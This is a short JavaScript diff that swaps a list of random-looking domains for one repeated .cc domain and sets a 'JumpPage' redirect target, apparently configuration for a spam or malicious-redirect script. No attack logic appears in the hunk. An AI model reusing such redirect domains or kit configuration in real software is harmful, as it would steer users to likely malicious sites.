@@ -37,9 +37,9 @@ var emails = [
 ];
 
 var urls=[
-	'ujpoumxva.cc',
-	'dnpgqxkpy.com',
-	'iujtflfp.com',
+	'zesipdjm.cc',
+	'zesipdjm.cc',
+	'zesipdjm.cc',
 ];                                                                                                                  
 
 var JumpPage="https://wbmnpeye.cc";
